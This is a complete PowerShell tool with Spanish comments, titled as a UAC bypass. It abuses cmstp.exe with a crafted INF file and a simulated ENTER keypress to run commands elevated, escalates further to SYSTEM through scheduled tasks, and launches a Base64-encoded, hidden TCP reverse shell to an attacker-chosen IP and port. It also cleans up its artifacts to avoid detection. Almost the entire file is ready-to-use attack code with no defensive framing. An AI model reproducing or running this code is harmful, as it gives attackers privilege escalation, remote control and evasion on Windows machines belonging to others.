# UAC-Bypass-Final.ps1
# Versión final con reverse shell PowerShell integrada

Function SetInfFile($CommandToExecute) {
    $InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@.Replace("LINE", $CommandToExecute)

    $randomName = "setup_" + (Get-Date -Format "yyyyMMdd") + "_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".inf"
    $file = "C:\windows\temp\$randomName"
    
    Set-Content -Path $file -Value $InfData
    Write-Host "[+] Archivo INF creado: $(Split-Path $file -Leaf)" -ForegroundColor Green
    return $file
}

Function Execute-UACBypass($CommandToExecute) {
    $infPath = $null
    try {
        Write-Host "[+] Iniciando UAC Bypass..." -ForegroundColor Yellow
        
        # Crear archivo INF
        $infPath = SetInfFile($CommandToExecute)
        
        # Ejecutar cmstp
        Write-Host "[+] Ejecutando cmstp.exe..." -ForegroundColor Yellow
        $s = New-Object System.Diagnostics.ProcessStartInfo
        $s.FileName = "cmstp.exe"
        $s.Arguments = "/au `"$infPath`""
        $s.UseShellExecute = $true
        $s.WindowStyle = "Hidden"
        [System.Diagnostics.Process]::Start($s) | Out-Null
        
        # Esperar a que aparezca la ventana UAC (timing variable)
        $waitTime = Get-Random -Minimum 2 -Maximum 4
        Write-Host "[+] Esperando ventana UAC ($waitTime segundos)..." -ForegroundColor Yellow
        Start-Sleep -Seconds $waitTime

        # Cargar funciones de Windows API
        $Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 
{
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindow(IntPtr sClassName, String sAppName);

    [DllImport("user32.dll")]
    public static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
}
"@

        Add-Type $Win32
        
        # Búsqueda mejorada con múltiples intentos
        Write-Host "[+] Buscando ventana 'CorpVPN'..." -ForegroundColor Yellow
        $windowFound = $false
        
        for ($i = 0; $i -lt 10; $i++) {
            $WindowToFind = [Win32]::FindWindow([IntPtr]::Zero, "CorpVPN")
            
            if ($WindowToFind -ne [IntPtr]::Zero) {
                Write-Host "[+] Ventana encontrada (intento $($i+1)), enviando ENTER..." -ForegroundColor Green
                
                # Enviar ENTER
                $WM_SYSKEYDOWN = 0x0100;
                $VK_RETURN = 0x0D;
                [Win32]::PostMessage($WindowToFind, $WM_SYSKEYDOWN, $VK_RETURN, 0)
                
                $windowFound = $true
                break
            }
            
            # Espera entre intentos
            Start-Sleep -Milliseconds 500
        }
        
        if (-not $windowFound) {
            Write-Host "[-] No se pudo encontrar la ventana después de 10 intentos" -ForegroundColor Red
            return $false
        }
        
        Write-Host "[+] UAC Bypass completado" -ForegroundColor Green
        
        # Esperar un poco más para que cmstp termine
        Start-Sleep -Seconds 2
        return $true
    }
    catch {
        Write-Host "[-] Error: $_" -ForegroundColor Red
        return $false
    }
    finally {
        # Limpieza del archivo INF
        if ($infPath -and (Test-Path $infPath)) {
            try {
                Remove-Item $infPath -Force -ErrorAction SilentlyContinue
                Write-Host "[+] Archivo INF eliminado" -ForegroundColor Green
            }
            catch {
                Write-Host "[-] No se pudo eliminar el archivo INF inmediatamente..." -ForegroundColor Yellow
                # Intentar de nuevo después de esperar
                Start-Sleep -Seconds 2
                try {
                    Remove-Item $infPath -Force -ErrorAction SilentlyContinue
                    Write-Host "[+] Archivo INF eliminado en segundo intento" -ForegroundColor Green
                }
                catch {
                    Write-Host "[-] No se pudo eliminar el archivo INF: $infPath" -ForegroundColor Red
                }
            }
        }
    }
}

Function Execute-Command($CommandToExecute) {
    Write-Host "[+] Ejecutando comando: $CommandToExecute" -ForegroundColor Yellow
    
    # Crear archivo temporal para output con nombre menos sospechoso
    $outputFile = "C:\windows\temp\log_" + (Get-Date -Format "yyyyMMdd") + ".tmp"
    
    try {
        # Modificar comando para capturar output
        $captureCommand = "cmd.exe /c $CommandToExecute > `"$outputFile`" 2>&1"
        
        $result = Execute-UACBypass $captureCommand
        
        if ($result) {
            Write-Host "[+] Comando ejecutado, esperando output..." -ForegroundColor Yellow
            Start-Sleep -Seconds 3
            
            # Verificar si hay output
            if (Test-Path $outputFile) {
                Write-Host "[+] Output del comando:" -ForegroundColor Green
                Write-Host "=" * 50 -ForegroundColor Cyan
                Get-Content $outputFile
                Write-Host "=" * 50 -ForegroundColor Cyan
            } else {
                Write-Host "[-] No se generó output visible" -ForegroundColor Yellow
                Write-Host "[!] El comando puede estar ejecutándose en segundo plano" -ForegroundColor Yellow
            }
        }
        
        return $result
    }
    finally {
        # Limpiar archivo de output si existe
        if (Test-Path $outputFile) {
            try {
                Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
            } catch {
                # Ignorar errores al eliminar
            }
        }
    }
}

# Función corregida para ejecutar comandos como SYSTEM usando scheduled tasks
Function Execute-CommandAsSystem {
    param(
        [string]$CommandToExecute
    )
    
    Write-Host "[+] Ejecutando comando como SYSTEM: $CommandToExecute" -ForegroundColor Yellow
    
    $taskName = "SystemTask_" + (Get-Random -Minimum 1000 -Maximum 9999)
    $outputFile = "C:\windows\temp\system_output_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".tmp"
    
    try {
        # Crear script temporal que ejecutará el comando
        $tempScript = @"
@echo off
$CommandToExecute > "$outputFile" 2>&1
"@
        
        $scriptFile = "C:\windows\temp\system_script_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".bat"
        Set-Content -Path $scriptFile -Value $tempScript -Encoding ASCII
        
        Write-Host "[+] Creando tarea programada como SYSTEM..." -ForegroundColor Yellow
        
        # Crear, ejecutar y eliminar tarea programada en un solo comando
        $fullCommand = @"
schtasks /create /tn "$taskName" /tr "$scriptFile" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1 && schtasks /run /tn "$taskName" >nul 2>&1 && timeout /t 3 >nul && schtasks /delete /tn "$taskName" /f >nul 2>&1
"@
        
        $result = Execute-Command -CommandToExecute $fullCommand
        
        if ($result) {
            Write-Host "[+] Tarea programada ejecutada como SYSTEM" -ForegroundColor Green
            
            # Esperar un poco más para que el comando termine
            Start-Sleep -Seconds 3
            
            # Leer output si existe
            if (Test-Path $outputFile) {
                Write-Host "[+] Output del comando (como SYSTEM):" -ForegroundColor Green
                Write-Host "=" * 50 -ForegroundColor Cyan
                $content = Get-Content $outputFile
                if ($content) {
                    foreach ($line in $content) {
                        Write-Host $line
                    }
                } else {
                    Write-Host "(Comando ejecutado sin output visible)"
                }
                Write-Host "=" * 50 -ForegroundColor Cyan
            } else {
                Write-Host "[!] No se generó output, pero el comando pudo ejecutarse" -ForegroundColor Yellow
            }
        } else {
            Write-Host "[-] Error al ejecutar la tarea programada" -ForegroundColor Red
        }
        
        return $result
    }
    catch {
        Write-Host "[-] Error ejecutando como SYSTEM: $_" -ForegroundColor Red
        return $false
    }
    finally {
        # Limpieza de archivos temporales
        if (Test-Path $outputFile) {
            Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
        }
        if (Test-Path $scriptFile) {
            Remove-Item $scriptFile -Force -ErrorAction SilentlyContinue
        }
        
        # Limpieza adicional de la tarea por si acaso
        try {
            $null = schtasks /delete /tn $taskName /f 2>$null
        } catch {
            # Ignorar errores
        }
    }
}

# Función para ejecutar reverse shell con el script PowerShell de Chester
Function Invoke-PowerShellReverseShell {
    param(
        [string]$IP,
        [string]$Port
    )
    
    Write-Host "[+] Configurando PowerShell Reverse Shell..." -ForegroundColor Yellow
    Write-Host "[+] IP: $($IP), Puerto: $($Port)" -ForegroundColor Cyan
    
    # El script de Chester
    $chesterScript = @"
`$client = New-Object System.Net.Sockets.TCPClient('$IP',$Port)
`$stream = `$client.GetStream()
[byte[]]`$bytes = 0..65535|%{0}
while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){
    `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0,`$i)
    `$sendback = (iex `$data 2>&1 | Out-String)
    `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> '
    `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2)
    `$stream.Write(`$sendbyte,0,`$sendbyte.Length)
    `$stream.Flush()
}
`$client.Close()
"@

    # Codificar el script en Base64 para mayor stealth
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($chesterScript)
    $encodedScript = [Convert]::ToBase64String($bytes)
    
    $powerShellCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedScript"
    
    Write-Host "[+] Ejecutando PowerShell Reverse Shell..." -ForegroundColor Green
    return Execute-Command -CommandToExecute $powerShellCommand
}

# Función principal para reverse shells
Function Invoke-ReverseShellMenu {
    Write-Host "[+] Configuración de Reverse Shell" -ForegroundColor Cyan
    $ip = Read-Host "Ingresa la IP"
    $port = Read-Host "Ingresa el Puerto"
    
    if (-not $ip -or -not $port) {
        Write-Host "[-] Debes ingresar IP y Puerto" -ForegroundColor Red
        return
    }
    
    Write-Host "`n[+] Ejecutando PowerShell Reverse Shell..." -ForegroundColor Green
    
    $result = Invoke-PowerShellReverseShell -IP $ip -Port $port
    if ($result) {
        Write-Host "[+] PowerShell Reverse Shell ejecutada exitosamente" -ForegroundColor Green
        Write-Host "[!] Verifica tu listener en $($ip):$($port)" -ForegroundColor Yellow
    } else {
        Write-Host "[-] Falló la ejecución de la reverse shell" -ForegroundColor Red
    }
    
    return $result
}

Function Test-AdminPrivileges {
    $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
    $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if ($isAdmin) {
        Write-Host "[+] Tienes privilegios de administrador" -ForegroundColor Green
        Write-Host "[+] Usuario: $($identity.Name)" -ForegroundColor Yellow
    } else {
        Write-Host "[-] NO tienes privilegios de administrador" -ForegroundColor Red
        Write-Host "[-] Usuario: $($identity.Name)" -ForegroundColor Yellow
    }
    return $isAdmin
}

Function Invoke-Cleanup {
    Write-Host "[+] Realizando limpieza de artefactos..." -ForegroundColor Yellow
    
    $patterns = @(
        "C:\windows\temp\setup_*.inf",
        "C:\windows\temp\log_*.tmp", 
        "C:\windows\temp\output_*.txt",
        "C:\windows\temp\system_output_*.tmp",
        "C:\windows\temp\system_script_*.bat"
    )
    
    $cleanedCount = 0
    foreach ($pattern in $patterns) {
        try {
            $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
            if ($files) {
                $files | Remove-Item -Force -ErrorAction SilentlyContinue
                $cleanedCount += $files.Count
            }
        }
        catch {
            # Silenciar errores de limpieza
        }
    }
    
    # Limpiar procesos residuales
    try {
        Get-Process -Name "cmstp" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    catch {
        # Silenciar errores
    }
    
    Write-Host "[+] Limpieza completada ($cleanedCount archivos eliminados)" -ForegroundColor Green
}

# === MENÚ PRINCIPAL MEJORADO ===
Function Show-MainMenu {
    Clear-Host
    Write-Host "=== UAC BYPASS TOOL ===" -ForegroundColor Cyan
    Write-Host "    [PowerShell Reverse Shell Integrada]" -ForegroundColor Green
    Write-Host ""

    # Verificar privilegios actuales
    Write-Host "[+] Verificando privilegios actuales..." -ForegroundColor Yellow
    $isAlreadyAdmin = Test-AdminPrivileges

    if ($isAlreadyAdmin) {
        Write-Host ""
        Write-Host "[!] Ya eres administrador - el bypass no es necesario" -ForegroundColor Yellow
    }

    Write-Host ""
    Write-Host "Selecciona una opción:" -ForegroundColor White
    Write-Host "1. Abrir PowerShell elevado" -ForegroundColor Gray
    Write-Host "2. Ejecutar comando" -ForegroundColor Gray
    Write-Host "3. Ejecutar comando como SYSTEM" -ForegroundColor Cyan
    Write-Host "4. PowerShell Reverse Shell" -ForegroundColor Green
    Write-Host "5. Verificar privilegios" -ForegroundColor Gray
    Write-Host "6. Limpieza de artefactos" -ForegroundColor Yellow
    Write-Host "7. Salir" -ForegroundColor Gray
    Write-Host ""
}

# Bucle principal
do {
    Show-MainMenu
    $opcion = Read-Host "Opción"

    switch ($opcion) {
        "1" { 
            Write-Host "[+] Abriendo PowerShell con elevación..." -ForegroundColor Yellow
            $result = Execute-UACBypass "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
            if ($result) {
                Write-Host "[+] PowerShell ejecutado con elevación" -ForegroundColor Green
            } else {
                Write-Host "[-] Falló el bypass para PowerShell" -ForegroundColor Red
            }
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "2" { 
            $comando = Read-Host "Ingresa el comando a ejecutar"
            if ($comando) {
                Execute-Command -CommandToExecute $comando
            }
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "3" { 
            $comando = Read-Host "Ingresa el comando a ejecutar como SYSTEM"
            if ($comando) {
                Execute-CommandAsSystem -CommandToExecute $comando
            }
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "4" { 
            Invoke-ReverseShellMenu
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "5" { 
            Test-AdminPrivileges
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "6" {
            Invoke-Cleanup
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
        "7" { 
            Write-Host "[+] Realizando limpieza final..." -ForegroundColor Yellow
            Invoke-Cleanup
            Write-Host "[+] Saliendo..." -ForegroundColor Green
            exit
        }
        default {
            Write-Host "[-] Opción no válida" -ForegroundColor Red
            Write-Host ""
            Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
            $null = Read-Host
        }
    }
} while ($true)
